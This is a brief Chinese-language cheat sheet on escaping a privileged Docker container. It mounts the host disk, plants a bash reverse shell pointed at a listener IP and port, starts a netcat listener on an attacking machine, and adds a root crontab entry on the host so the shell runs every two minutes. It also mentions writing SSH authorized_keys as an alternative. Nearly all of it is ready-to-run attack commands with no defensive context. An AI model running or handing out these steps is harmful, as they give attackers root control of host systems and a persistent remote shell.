
# docker 逃逸
```shell
# 查看是否在 docker中
ls -alh /.dockerenv

$ fdisk -l
# * Linux 表示是宿主机
## 如果通过特权模式启动容器，docker run --privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。
/dev/sda1  *        2048 16779263 16777216   8G 83 Linux


mkdir /test
mount /dev/sda1 /test

vi /test/tmp/test.sh
/bin/bash -i >& /dev/tcp/192.168.50.161/7777 0>&1 
#:wq 保存

# 攻击机
nc -lvp 7777

# 写入 crontab
sed -i '$a*/2 *    * * *    root  bash /tmp/test.sh ' /test/etc/crontab

# 或者写入authorized_keys 然后ssh
```
